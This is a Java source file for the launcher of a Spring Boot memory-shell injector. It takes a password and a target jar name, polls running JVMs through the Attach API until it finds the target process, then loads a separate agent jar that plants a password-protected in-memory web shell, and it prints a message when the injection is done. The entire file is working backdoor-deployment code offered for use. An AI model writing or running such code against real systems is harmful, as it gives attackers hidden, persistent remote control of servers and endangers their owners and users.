package me.mole;

import com.sun.tools.attach.VirtualMachine;
import com.sun.tools.attach.VirtualMachineDescriptor;

import java.io.File;
import java.util.List;

public class AttachApp {
    public static void main(String[] args) throws Exception {

        if (args.length != 2) {
            System.out.println("Usage:java -jar AgentSpringbootMemShellInject.jar <password> <springboot-jar-name-without-suffix>");
            return;
        }
        VirtualMachine vm = null;
        List<VirtualMachineDescriptor> vmList = null;
        String password = args[0];
        String targetSpringbootJarName = args[1] + ".jar";
        String targetSpringbootJarNameWithoutSuffix = args[1];
        String currentPath = AttachApp.class.getProtectionDomain().getCodeSource().getLocation().getPath();
        currentPath = currentPath.substring(0, currentPath.lastIndexOf("/") + 1);
        String agentFile = currentPath + "AgentSpringbootMemShell.jar";
        agentFile = new File(agentFile).getCanonicalPath();
        String agentArgs = currentPath;
        if (!password.equals("") || password != null) {
            agentArgs = agentArgs + "^" + password + "^" + targetSpringbootJarNameWithoutSuffix;
        }

        while (true) {
            try {
                vmList = VirtualMachine.list();
                if (vmList.size() <= 0)
                    continue;
                for (VirtualMachineDescriptor vmd : vmList) {
                    System.out.println("vmd.displayName=" + vmd.displayName());
                    if (vmd.displayName().indexOf(targetSpringbootJarName) >= 0) {
                        vm = VirtualMachine.attach(vmd);

                        System.out.println("----- vmd.displayName=" + vmd.displayName());
                        System.out.println("[+]OK.i find a jvm.");
                        Thread.sleep(1000);
                        if (null != vm) {
                            System.out.println("agentFile=" + agentFile);
                            System.out.println("agentArgs=" + agentArgs);
                            vm.loadAgent(agentFile, agentArgs);
                            System.out.println("[+]memeShell is injected.");
                            vm.detach();
                            return;
                        }
                    }
                }
                Thread.sleep(3000);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }
}
